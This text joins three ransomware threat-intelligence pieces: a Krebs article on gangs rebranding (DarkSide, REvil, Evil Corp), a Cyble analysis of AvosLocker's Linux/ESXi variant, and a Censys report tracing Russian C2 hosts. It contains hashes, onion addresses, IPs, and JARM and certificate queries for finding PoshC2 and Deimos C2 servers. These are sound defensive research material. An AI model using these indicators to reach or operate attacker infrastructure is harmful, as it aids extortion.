network.\n\nhttps://krebsonsecurity.com/2021/08/ransomware-gangs-and-the-name-game-distraction/\nhttps://krebsonsecurity.com/wp-content/uploads/2021/08/ransmocalendar.png\n\n\n2/7\n\nI put together the above graphic to illustrate some of the more notable ransom gang\nreinventions over the past five years. What it doesn’t show is what we already know about\nthe cybercriminals behind many of these seemingly disparate ransomware groups, some of\nwhom were pioneers in the ransomware space almost a decade ago. We’ll explore that more\nin the latter half of this story.\n\nOne of the more intriguing and recent revamps involves DarkSide, the group that extracted a\n$5 million ransom from Colonial Pipeline earlier this year, only to watch much of it get\nclawed back in an operation by the U.S. Department of Justice.\n\nAfter acknowledging someone had also seized their Internet servers, DarkSide announced it\nwas folding. But a little more than a month later, a new ransomware affiliate program called\nBlackMatter emerged, and experts quickly determined BlackMatter was using the same\nunique encryption methods that DarkSide had used in their attacks.\n\nDarkSide’s demise roughly coincided with that of REvil, a long-running ransomware group\nthat claims to have extorted more than $100 million from victims. REvil’s last big victim was\nKaseya, a Miami-based company whose products help system administrators manage large\nnetworks remotely. That attack let REvil deploy ransomware to as many as 1,500\norganizations that used Kaseya.\n\nREvil demanded a whopping $70 million to release a universal decryptor for all victims of the\nKaseya attack. Just days later, President Biden reportedly told Russian President Vladimir\nPutin that he expects Russia to act when the United States shares information on specific\nRussians involved in ransomware activity.\n\nhttps://krebsonsecurity.com/2021/06/justice-dept-claws-back-2-3m-paid-by-colonial-pipeline-to-ransomware-gang/\nhttps://krebsonsecurity.com/2021/05/darkside-ransomware-gang-quits-after-servers-bitcoin-stash-seized/\nhttps://www.bleepingcomputer.com/news/security/darkside-ransomware-gang-returns-as-new-blackmatter-operation/\nhttps://www.cnbc.com/2021/07/09/ransomware-biden-presses-putin-to-disrupt-cybercriminals-in-russia.html\n\n\n3/7\n\nA REvil ransom note.\n\nWhether that conversation prompted actions is unclear. But REvil’s victim shaming blog\nwould disappear from the dark web just four days later.\n\nMark Arena, CEO of cyber threat intelligence firm Intel 471, said it remains unclear whether\nBlackMatter is the REvil crew operating under a new banner, or if it is simply the\nreincarnation of DarkSide.\n\nBut one thing is clear, Arena said: “Likely we will see them again unless they’ve been\narrested.”\n\nLikely, indeed. REvil is widely considered a reboot of GandCrab, a prolific ransomware gang\nthat boasted of extorting more than $2 billion over 12 months before abruptly closing up shop\nin June 2019. “We are living proof that you can do evil and get off scot-free,” Gandcrab\nbragged.\n\nAnd wouldn’t you know it: Researchers have found GandCrab shared key behaviors with\nCerber, an early ransomware-as-a-service operation that stopped claiming new victims at\nroughly the same time that GandCrab came on the scene.\n\nGOOD GRIEF\n\nThe past few months have been a busy time for ransomware groups looking to rebrand.\nBleepingComputer recently reported that the new “Grief” ransomware startup was just the\nlatest paintjob of DoppelPaymer, a ransomware strain that shared most of its code with an\n\nhttps://www.intel471.com/\nhttps://krebsonsecurity.com/?s=gandcrab\nhttps://research.checkpoint.com/2018/gandcrab-ransomware-mindset/\nhttps://www.bleepingcomputer.com/news/security/doppelpaymer-ransomware-gang-rebrands-as-the-grief-group/\n\n\n4/7\n\nearlier iteration from 2016 called BitPaymer.\n\nAll three of these ransom operations stem from a prolific cybercrime group known variously\nas TA505, “Indrik Spider” and (perhaps most memorably) Evil Corp. According to security\nfirm CrowdStrike, Indrik Spider was formed in 2014 by former affiliates of the GameOver\nZeus criminal network who internally referred to themselves as “The Business Club.”\n\nThe Business Club was a notorious Eastern European organized cybercrime gang accused\nof stealing more than $100 million from banks and businesses worldwide. In 2015, the FBI\noffered a standing $3 million bounty for information leading to the capture of the Business\nClub’s leader — Evgeniy Mikhailovich Bogachev. By the time the FBI put a price on his\nhead, Bogachev’s Zeus trojan and later variants had been infecting computers for nearly a\ndecade.\n\nhttps://attack.mitre.org/groups/G0092/\nhttps://krebsonsecurity.com/2019/12/inside-evil-corp-a-100m-cybercrime-menace/\nhttps://krebsonsecurity.com/tag/gameover-zeus/\nhttps://krebsonsecurity.com/2015/08/inside-the-100m-business-club-crime-gang/\nhttps://krebsonsecurity.com/2015/02/fbi-3m-bounty-for-zeus-trojan-author/\n\n\n5/7\n\nThe alleged ZeuS Trojan author, Evgeniy Mikhaylovich Bogachev. Source: FBI\n\nBogachev was way ahead of his colleagues in pursuing ransomware. His Gameover Zeus\nBotnet was a peer-to-peer crime machine that infected between 500,000 and a million\nMicrosoft Windows computers. Throughout 2013 and 2014, PCs infected with Gameover\nwere seeded with Cryptolocker, an early, much-copied ransomware strain allegedly authored\nby Bogachev himself.\n\nCrowdStrike notes that shortly after the group’s inception, Indrik Spider developed their own\ncustom malware known as Dridex, which has emerged as a major vector for deploying\nmalware that lays the groundwork for ransomware attacks.\n\nhttps://krebsonsecurity.com/2014/06/backstage-with-the-gameover-botnet-hijackers/\nhttps://en.wikipedia.org/wiki/CryptoLocker\nhttps://any.run/malware-trends/dridex\n\n\n6/7\n\n“Early versions of Dridex were primitive, but over the years the malware became increasingly\nprofessional and sophisticated,” CrowdStrike researchers wrote. “In fact, Dridex operations\nwere significant throughout 2015 and 2016, making it one of the most prevalent eCrime\nmalware families.”\n\nThat CrowdStrike report was from July 2019. In April 2021, security experts at Check Point\nSoftware found Dridex was still the most prevalent malware (for the second month running).\nMainly distributed via well-crafted phishing emails — such as a recent campaign that\nspoofed QuickBooks — Dridex often serves as the attacker’s initial foothold in company-\nwide ransomware attacks, CheckPoint said.\n\nREBRANDING TO AVOID SANCTIONS\n\nAnother ransomware family tied to Evil Corp. and the Dridex gang is WastedLocker, which\nis the latest name of a ransomware strain that has rebranded several times since 2019. That\nwas when the Justice Department put a $5 million bounty on the head of Evil Corp., and the\nTreasury Department’s Office of Foreign Asset Control (OFAC) said it was prepared to\nimpose hefty fines on anyone who paid a ransom to the cybercrime group.\n\nAlleged Evil Corp leader Maksim “Aqua” Yakubets.

The drama began when the Babuk ransomware group\nannounced in May that they were starting a new platform for data leak extortion, which was\nintended to appeal to ransomware groups that didn’t already have a blog where they can\npublicly shame victims into paying by gradually releasing stolen data.\n\nOn June 1, Babuk changed the name of its leaks site to payload[dot]bin, and began leaking\nvictim data. Since then, multiple security experts have spotted what they believe is another\nversion of WastedLocker dressed up as payload.bin-branded ransomware.\n\n“Looks like EvilCorp is trying to pass off as Babuk this time,” wrote Fabian Wosar, chief\ntechnology officer at security firm Emsisoft. “As Babuk releases their PayloadBin leak portal,\nEvilCorp rebrands WastedLocker once again as PayloadBin in an attempt to trick victims into\nviolating OFAC regulations.”\n\nExperts are quick to point out that many cybercriminals involved in ransomware activity are\naffiliates of more than one distinct ransomware-as-a-service operation. In addition, it is\ncommon for a large number of affiliates to migrate to competing ransomware groups when\ntheir existing sponsor suddenly gets shut down.\n\nAll of the above would seem to suggest that the success of any strategy for countering the\nransomware epidemic hinges heavily on the ability to disrupt or apprehend a relatively small\nnumber of cybercriminals who appear to wear many disguises.\n\nPerhaps that’s why the Biden Administration said last month it was offering a $10 million\nreward for information that leads to the arrest of the gangs behind the extortion schemes,\nand for new approaches that make it easier to trace and block cryptocurrency payments.\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/\nhttps://www.bleepingcomputer.com/news/security/new-evil-corp-ransomware-mimics-payloadbin-gang-to-evade-us-sanctions/\nhttps://twitter.com/fwosar/status/1401110845820747797\nhttps://www.nytimes.com/2021/07/15/us/biden-reward-ransomware.html",

AvosLocker is a ransomware group identified in 2021,\nspecifically targeting Windows machines. Additionally, Cyble Research Labs have come across a Twitter post\nthat mentioned a new Linux variant of AvosLocker ransomware targeting VMware ESXi servers. In this blog\npost, we will discuss AvosLocker Linux ransomware in detail.\n\nCyble Research Labs found through dark/deepweb research that the Threats Actors (TAs) or affiliates of\nAvosLocker ransomware groups are using Proxyshell to exploit Microsoft Exchange Server vulnerabilities\ncompromising victim’s network, such as CVE-2021-34473, CVE-2021-31206, CVE-2021-34523, and CVE-\n2021-31207. Once the TAs access the machine, they deploy mimikatz to dump passwords. TAs can get RDP\naccess to the domain controller by using the identified passwords, exfiltrating data from the compromised\nmachine. Finally, AvosLocker ransomware gets deployed on the victim system by the attacker to encrypt the\nvictim’s documents and files.\n\nTechnical analysis\n\nhttps://blog.cyble.com/2022/01/17/avoslocker-ransomware-linux-version-targets-vmware-esxi-servers/\nhttps://blog.cyble.com/2021/07/23/deep-dive-analysis-avoslocker-ransomware/\nhttps://twitter.com/ChristiaanBeek/status/1480551019310469120\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31206\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207\nhttps://attack.mitre.org/software/S0002/\n\n\n2/8\n\nBased on static analysis, we found that the malicious file is an x64 based Executable and Linkable Format\n(ELF) file, as shown in Figure 1.\n\nFigure 1 – Static\n\nELF File Details\nUpon executing the AvosLocker ransomware on Linux machines, it instructs the user to run a command which\nhas the parameter that specifies the path of the directory to be encrypted. Also, the command has another\nparameter that denotes the number of threads to be involved in the encryption process. The in-built\nmultithreading functionality helps TAs to encrypt the files faster, as shown in Figure 2.\n\nFigure 2 – Malware Instructs\n\nfor Drive Path\nAfter execution, the AvosLocker checks the presence of VMware Elastic Sky X Integrated (ESXi), Virtual\nMachine File System (VMFS), and kills the Virtual Machines (VMs) if they are running using the command\ngiven in the figure below.\n\nFigure 3 – Command to Kill ESXi VMs\nThe below figure demonstrates that the malware appends the extension as .avoslinux after encrypting the files\non the victim’s machine.\n\n\n\n3/8\n\nFigure 4 – Appends the File Extension after Encryption\n\nBefore encrypting the files, the malware performs thread synchronization operation using mutex lock/unlock\nAPIs to avoid overlapping the encryption process, as shown in Figure 5.\n\nFigure 5 – Thread Synchronization Encrypting the Files\n\nThe content of an encrypted file has base64 encoded content at the end of the file. As shown in the figure\nbelow, we suspect that the base64 encoded data contains a cryptographic key used to encrypt the file.\n\nFigure 6 – Encrypted File Contents\nBefore starting the encryption process, the malware drops ransom notes with the name\nREADME_FOR_RESTORE.txt in the specific drive. Then, like other ransomware groups, the attackers instruct\nthe victims to visit the TOR website, as shown in the figure below.\n\n\n\n4/8\n\nFigure 7 – Ransom note\nWhen the victim visits AvosLocker’s TOR website, it asks for the ID given on the ransom note to proceed with\nthe payment process, as shown in the below figure.\n\nFigure 8 – AvosLocker’s\n\nTOR Website\nOnce the victim enters the ID, the website redirects to the payment page where TAs instructs victims to pay\nUSD 1,000,000.00/ 4629.63 XMR/ 28.61 BTC (25% processing fee) – the ransom amount would double if the\nvictim does not pay the ransom before the deadline.\n\nFor payment through Monero, the TAs has provided Monero ID and the payment ID, as shown in Figure 9.\n\n\n\n5/8\n\nFigure 9 – AvosLocker’s Payment Page\n\nOther Observations\n\nCyble Research Labs had found that the TAs leaked their victim’s details on their leak website when victims\nfailed to pay the ransom. The following figure showcases the Avoslocker leak website with recent victims.\n\nFigure 10 – List of Victims Mentioned on the Leak Site\nAlso, the leak site noted that TAs had mentioned an affiliate program that provides Ransomware as a Service\n(RaaS), which includes Affiliate panels, Calling Services, etc., as shown in the below figure.\n\n\n\n6/8\n\nFigure 11 –\n\nAvosLocker’s Partnership Program\nThe ransomware groups are looking for support to expand their cybercrime ransomware business in the\ncountries such as the USA, Canada, the United Kingdom, and Australia, as shown in the figure below.\n\nFigure 12 – TA’s Post on\n\nCyber Crime Forum\n\nConclusion\n\nThere is likely a new version of AvosLocker ransomware for the Linux platform. The latest version is where\ncybercriminals added a unique code to evolve their Raas services with new Tactics, Techniques, and\nProcedures (TTP), which targets ESXi and VMFS machines. Therefore, we believe that there may be an\nenhancement in the form of an upcoming variant of the AvosLocker ransomware.\n\nWe are continuously monitoring AvosLocker’s extortion campaign and updating our readers with the latest\ninformation as and when we find it.\n\nOur Recommendations\n\nWe have listed some essential cybersecurity best practices that create the first line of control against\nattackers. We recommend that our readers follow the best practices given below:  \n\nSafety measures needed to prevent ransomware attacks\n\nConduct regular backup practices and keep those backups offline or in a separate network.\n\n\n\n7/8\n\nTurn on the automatic software update feature on your computer, mobile, and other connected devices\nwherever possible and pragmatic. \nUse a reputed anti-virus and Internet security software package on your connected devices, including\nPC, laptop, and mobile.\nRefrain from opening untrusted links and email attachments without verifying their authenticity.\n\nUsers should take the following steps after a ransomware attack\n\nDetach infected devices on the same network.\nDisconnect external storage devices if connected\nInspect system logs for doubtful events.\n\nImpacts and cruciality Of AvosLocker Ransomware\n\nLoss of Valuable data.\nLoss of organizations reliability or integrity.\nLoss of organisation’s businesses information.\nDisruption in organization operation.\nEconomic loss.\n\nMITRE aTT&CK® tECHNIQUES\n\nTactic Technique ID Technique Name\n\nInitial Access T1190 \n T1189\n\n– Exploit Public-Facing Application\n – Drive-by Compromise\n\nExecution T1059 – Command and Scripting Interpreter\n\nCredential Access T1555 – Credentials from Password Stores\n\nDiscovery T1082 – System Information Discovery\n\nCollection T1530 – Data from Cloud Storage Object\n\nImpact T1490\n T1489\n T1486\n\n– Inhibit System Recovery \n – Service Stop\n\n – Data Encrypted for Impact\n\nindicators Of Compromise (IOCs)\n\nIndicators Indicator\ntype\n\nDescription\n\n0cd7b6ea8857ce827180342a1c955e79c3336a6cf2000244e5cfd4279c5fc1b6 SHA256 AvosLocker\nELF\n\n10ab76cd6d6b50d26fde5fe54e8d80fceeb744de8dbafddff470939fac6a98c4 SHA256 AvosLocker\nELF\n\n7c935dcd672c4854495f41008120288e8e1c144089f1f06a23bd0a0f52a544b1 SHA256 AvosLocker\nELF\n\nhttps://attack.mitre.org/techniques/T1190/\nhttps://attack.mitre.org/techniques/T1189/\nhttps://attack.mitre.org/techniques/T1059/\nhttps://attack.mitre.org/techniques/T1555/\nhttps://attack.mitre.org/techniques/T1082/\nhttps://attack.mitre.org/techniques/T1530\nhttps://attack.mitre.org/techniques/T1490/\nhttps://attack.mitre.org/techniques/T1489/\nhttps://attack.mitre.org/techniques/T1486/\n\n\n8/8\n\ne737c901b80ad9ed2cd800fec7c2554178c8afab196fb55a0df36acda1324721 SHA256 Archive File\nContaining\nAvosLocker\nELF\n\nhxxp://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad[.]onion URL AvosLocker’s\nTOR Website\n\nhxxp://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad[.]onion URL AvosLocker’s\nleak website",

Historical \nanalysis indicated one of these Russian hosts also used the tool PoshC2. These \ntools allow penetration testers and hackers to gain access to and manage \ntarget hosts.\nCensys then used details from the PoshC2 certificate to locate, among hosts \nelsewhere in the world including the US, two additional Russian hosts also \nusing the PoshC2 certificate. Censys data showed these two Russian hosts \npossessing confirmed malware packages, one of which included a \nransomware kit and a file that indicated two additional Russian Bitcoin hosts.\n\nAdditionally, Censys located a host in Ohio also possessing the Deimos C2 tool \ndiscovered on the initial Russian host and, leveraging historical analysis, \ndiscovered that the Ohio host possessed a malware package with software \nsimilarities to the Russian ransomware hosts possessing PoshC2 mentioned \nabove, in October 2021.\n\nAssessment\nCensys assesses that initially discovered Russian Hosts A & B with Metasploit \nand Deimos C2 are possibly initial attack vectors to take over victim hosts. \nRussian Hosts F & G possess malware capable of disabling anti-virus and \nperforming a ransomware attack, with beacons to two Bitcoin nodes that likely \nreceive ransomware payment from victims.\n\nMethodology\nCensys conducts continuous technical Internet scanning on all publicly \navailable IPv4 hosts in the world. In this investigation, Censys leveraged its own \ndata in the form of software enumeration, certificate documentation, historical \nevidence, HTTP body responses, and geolocational data to identify and pivot \nthrough this network. Censys confirmed the offensive exploit, C2, and malware \ntools through 3rd party sources referenced in this report.\n\nExecutive Summary\n\n3\n\n\n\n4\n\nSoftware search in Russia \n& Metasploit Discovery\n\nOn or about 24 June 2022, Censys ran a report to view the top 1000 software products \ncurrently observable amongst the over 7.4 million hosts discovered by Censys in \nRussia. Metasploit, a penetration testing toolkit developed by Rapid7, was observed by \nCensys on nine of these hosts. Although Metasploit enables users to compromise \ntarget hosts, it is used by many legitimate penetration testing teams for cybersecurity \npurposes, so Censys investigated the hosts’  current postures to look for any other \nindicators of nefarious activity. On one host - 5.101.5[.]196 or, Host A - Censys also found\n\nthe web vulnerability tester \nAcunetix on port 3443 as \nwell as the Deimos C2 tool \non port 8443. Since those \nadditional tools were only \nfound on Host A, Censys \ndecided to investigate \nfurther\n\nSee For Yourself - Run This Query:\n(location.country= `Russia`) and \nservices.software.product=`Metasploit`\n\nhttps://search.censys.io/search/report?resource=hosts&q=location.country%3D+%60Russia%60&virtual_hosts=EXCLUDE&field=services.software.product&num_buckets=1000\nhttps://search.censys.io/search?resource=hosts&q=%28location.country%3D+%60Russia%60%29+and+services.software.product%3D%60Metasploit%60&virtual_hosts=EXCLUDE\nhttps://search.censys.io/search?resource=hosts&q=%28location.country%3D+%60Russia%60%29+and+services.software.product%3D%60Metasploit%60&virtual_hosts=EXCLUDE\n\n\n5\n\nDeimos C2 JARM fingerprint search\nDeimos C2 “is a post-exploitation Command & Control (C2) tool that leverages \nmultiple communication methods in order to control machines that have been \ncompromised.”1  This is also a tool used by legitimate cybersecurity penetration testers \nto manage their operations and it stands to reason that a host used for such purposes \nmight have both Metasploit, Acunetix, and a C2 tool.  However, given Host A’s country of \norigin and the presence of the additional tools on only one host, we searched Censys’ \ndata via the JARM fingerprint associated with Deimos C2 to determine the prevalence \nof Deimos C2 worldwide. If Deimos C2 was highly prevalent, then it might be a benign \nconnection.\n\nInstead, Censys found only three other hosts with a matching Deimos C2 JARM \nfingerprint, highlighted below. The Chinese host (Host C) had a matching JARM \nfingerprint, but did not seem to have any other identifying data points. Russian Host B \nlisted Deimos C2 in the HTML Title, as did the original Russian host and mirrored the \nsame ports, protocols, and software almost exactly. Ohio Host D, however, did not have \na similar configuration, but did match the Deimos C2 JARM and the HTML title.\n\n1 https://github.com/DeimosC2/DeimosC2\n\nhttps://search.censys.io/search?q=services.jarm.fingerprint%3A+1bd1bd1bd0001bd00041d1bd1bd41db0fe6e6bbf8c4edda78e3ec2bfb55687&resource=hosts\nhttps://github.com/DeimosC2/DeimosC2\n\n\n6\n\nDeimos C2 JARM fingerprint search\n\nSee For Yourself - Run This Query:\nservices.jarm.fingerprint: \n1bd1bd1bd0001bd00041d1bd1bd41db0fe\n6e6bbf8c4edda78e3ec2bfb55687\n\nhttps://search.censys.io/search?q=services.jarm.fingerprint%3A+1bd1bd1bd0001bd00041d1bd1bd41db0fe6e6bbf8c4edda78e3ec2bfb55687&resource=hosts\nhttps://search.censys.io/search?q=services.jarm.fingerprint%3A+1bd1bd1bd0001bd00041d1bd1bd41db0fe6e6bbf8c4edda78e3ec2bfb55687&resource=hosts\nhttps://search.censys.io/search?q=services.jarm.fingerprint%3A+1bd1bd1bd0001bd00041d1bd1bd41db0fe6e6bbf8c4edda78e3ec2bfb55687&resource=hosts\n\n\n7\n\nHost D with Deimos C2\n\n07Oct21 - 11Oct21\n\nHost D had Deimos C2 running on port 8443 as recently as 06 July 2022. Also notable, \nwas that Censys observed “Squid Cache Squid 3.5.27” software on port 31337, which is \na “is a caching and forwarding HTTP web proxy.”2 Proxies have legitimate uses, but \n“[a]dversaries may use an external proxy to act as an intermediary for network \ncommunications to a command and control server to avoid direct connections to \ntheir infrastructure.”3  \n\nCensys further investigated this host’s history to find “Python Software Foundation \nSimpleHTTP 0.6” and an HTTP response body displaying a directory listing for \nmalware executables on port 8090 from 07 October to 11 October 2021. The same \nsoftware and identical directory prompt with different malware executables were \nalso on Russian Hosts F, G, H, and Virginia Host E.\n\nOne executable found on the Host D, pss.exe, was identified as part of Karma \nransomware group as it writes a notice to victims identifying it as such, and also is \nassessed to encrypt files on the victim host.4  \n\n2 https://en.wikipedia.org/wiki/Squid_(software)\n3 https://attack.mitre.org/techniques/T1090/002/\n4 https://www.joesandbox.com/analysis/467911/1/html\n\nOhio attacks\n- 2nov21 toledo \n\nlibrary\n- 15nov21 \n\nSOMC \n\nhttps://search.censys.io/hosts/3.133.59.113?at_time=2021-10-08T09%3A58%3A29.506Z\nhttps://search.censys.io/hosts/3.133.59.113?at_time=2021-10-08T01%3A16%3A05.025Z\nhttps://www.joesandbox.com/analysis/467911/1/html\nhttps://en.wikipedia.org/wiki/Squid_(software)\nhttps://attack.mitre.org/techniques/T1090/002/\nhttps://www.joesandbox.com/analysis/467911/1/html\nhttps://www.seculore.com/resources/cyber-attack-archive/ohio\nhttps://www.13abc.com/2021/11/02/toledo-library-computers-taken-out-targeted-cybersecurity-incident/\nhttps://www.13abc.com/2021/11/02/toledo-library-computers-taken-out-targeted-cybersecurity-incident/\nhttps://healthitsecurity.com/news/ehr-downtime-persists-in-wake-of-ohio-medical-center-cyberattack\nhttps://healthitsecurity.com/news/ehr-downtime-persists-in-wake-of-ohio-medical-center-cyberattack\n\n\n8\n\nHost D with Deimos C2\n\n07Oct21 - 11Oct21\n\nOhio attacks\n- 2nov21 toledo \n\nlibrary\n- 15nov21 \n\nSOMC \n\nhttps://search.censys.io/hosts/3.133.59.113?at_time=2021-10-08T09%3A58%3A29.506Z\nhttps://www.seculore.com/resources/cyber-attack-archive/ohio\nhttps://www.13abc.com/2021/11/02/toledo-library-computers-taken-out-targeted-cybersecurity-incident/\nhttps://www.13abc.com/2021/11/02/toledo-library-computers-taken-out-targeted-cybersecurity-incident/\nhttps://healthitsecurity.com/news/ehr-downtime-persists-in-wake-of-ohio-medical-center-cyberattack\nhttps://healthitsecurity.com/news/ehr-downtime-persists-in-wake-of-ohio-medical-center-cyberattack\n\n\n9\n\nPoshC2 Certificate on \noriginal Russian host\n\nAfter locating ransomware executables on Ohio Host D, Censys revisited the original \nRussian Host A for other indicators of nefarious activity. While conducting an historical \nanalysis of Host A, Censys found port 31001 added on 30 May 2022 and not recently \nopen. After reviewing the host summary on this date, Censys noticed a certificate on \nport 433 listing the location as Minnetonka, MN which seemed anomalous for a Russian \nhost. What is more, the “O” or Organization listed was “Pajfds” and the “OU” or \nOrganizational Unit listed was “Jethpro” which seemed suspicious to Censys. \n\nCensys performed a Google search for these certificate details and found the exact \nsame certificate details listed as an Indicator of Compromise (IOC) for the PoshC2 tool, \non the website of the developer, Nettitude Labs. PoshC2 is a free and open source, \n“proxy aware C2 framework used to aid penetration testers with red teaming, \npost-exploitation and lateral movement.” The website also lists an HTTP response as \nan IOC that mirrors the response Censys obtained from Russian Host A during \nscanning. \n\nFurthermore, PoshC2 documentation directs that a Python programming language kit \nbe installed on target hosts, serving as another probable IOC as well as identifying \nprobable threat actors, should Python software be found on hosts also possessing the \nPoshC2 certificate.\n\nhttps://search.censys.io/hosts/5.101.5.196?at_time=2022-05-30T20%3A49%3A01.704Z\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/\n\n\n10\n\nFremont Host K with PoshC2 \nOn 21 April 2021, Censys observed Host K with a PoshC2 certificate and possible \nmalware kit on port 80 with a directory format identical to other PoshC2 hosts with \nconfirmed malware kits, but Censys was unable to link any of the files listed on Host K \nto any known malware or nefarious activity. Similar to Virginia Host E, however, the \nFremont host does also have Python and Apache software installed. \nCensys is hesitant to suggest this could be a proxy of a C2 network as Censys found no \ndirect ties to any Russian hosts, either nefariously identified in this report or otherwise, \nexcept for the presence of the PoshC2 certificate and similar directory listing format. A \npossible explanation is that this host is functioning as a legitimate penetration testing \ntool by legitimate security practitioners. Censys is including this host in the report for \nthoroughness and to allow other researchers to rule out the host as nefarious.\n\nA file analysis was not possible as the host has closed this port and Censys’ \nobservance of the possible malware kit was historical.\n\nhttps://search.censys.io/hosts/173.255.218.175?at_time=2021-04-21T23%3A37%3A45.081Z\n\n\n11\n\nPoshC2 Certificate on \noriginal Russian host\n\nhttps://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/\n\nhttps://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/\n\n\n12\n\nPoshC2 Certificate on Eight \nOther Hosts\n\nAgain, while C2 tools are not nefarious in and of themselves, the fact that Russian Host A \nis currently using Demios C2 whose JARM links to Host D that previously hosted malware, \nCensys performed a worldwide search for other hosts presenting the PoshC2 certificate \ndiscovered on the Host A in May 2022. \n\nCensys uncovered eight other hosts with the PoshC2 certificate on/about 24 June 2022.\n\nThese hosts can be described in four categories:\n● Hosts F and G with malware kit \n● Host E with a malware kit \n● Host K with a possible malware kit \n● Hosts K through O with only the PoshC2 certificate \n\nSee For Yourself - \nRun This Query:\nservices.tls.certificate\ns.leaf_data.subject_d\nn=`C=US, \nST=Minnesota, \nL=Minnetonka, \nO=Pajfds, \nOU=Jethpro, \nCN=P18055077`\n\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\nhttps://search.censys.io/search?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts\n\n\n13\n\nRussian Host F with PoshC2 \nHost F was presenting the PoshC2 HTTP response and certificate as recently as 22 June \n2022. Additionally, on port 8000, Censys discovered not only Python software previously \nmentioned as required for attackers to implant on targets, but also an HTTP response \nthat includes the malware kit depicted below. This was observed as recently as 07 July \n2022. This malware kit allows an attacker to disable a target’s antivirus, remotely \nmanage the target, contains a trojan and callbacks to two other Russian hosts with \noperational Bitcoin ports, one of which is listed on a Bitcoin node directory. This same \nhost, 92.53.90.70, also previously had a Covenant C2 certificate and HTML Title on 05 \nMay 2022. A full malware analysis of the kit found on Host F can be found in Appendix A.\n\nThrough a historical analysis of the malware kit on port 8000, Censys discovered that \non 15 June 2022, this malware kit had “restoreassistance_net@decorous[.]cyou” \nappended to each of the files. A Google search revealed “@decorous[.]cyou” as a \ndomain used by the MedusaLocker group, confirmed by a CISA Alert.\n\nCensys assesses that this constitutes a “smoking gun” and implicates this host as part \nof a ransomware C2 network, likely as an attacker or a proxy (as a victim is possible, \nhowever, Censys’ historical analysis indicates the presence, removal, and \nreemergence of the PoshC2 certificate and a persistence of the malware kit modified \nover time which would be more in line with an attacker modifying their attack \nmethods).\n\nhttps://search.censys.io/hosts/95.213.145.99?at_time=2022-06-23T13%3A36%3A49.009Z\nhttps://search.censys.io/hosts/95.213.145.99?at_time=2022-06-23T13%3A36%3A49.009Z\nhttps://bitnodes.io/nodes/92.53.90.70-8333/\nhttps://github.com/cobbr/Covenant\nhttps://search.censys.io/certificates/8442d92b4cf6015a038e3c9cac63fbdecbbfec75feea3a73648afafdc1d7fb12\nhttps://search.censys.io/hosts/92.53.90.70?at_time=2022-05-05T09%3A00%3A27.983Z\nhttps://search.censys.io/hosts/92.53.90.70?at_time=2022-05-05T09%3A00%3A27.983Z\nhttps://search.censys.io/hosts/95.213.145.99?at_time=2022-06-15T19%3A19%3A44.038Z\nhttps://www.pcrisk.com/removal-guides/21481-l54-ransomware\nhttps://www.cisa.gov/uscert/ncas/alerts/aa22-181a\n\n\n14\n\nRussian Host F with PoshC2 \n\nDisables Windows Defender Security Center\nRemote desktop access/management \n\nDisables Windows Defender & Malwarebytes Anti Spyware\n\nTrojan (Virus Total).

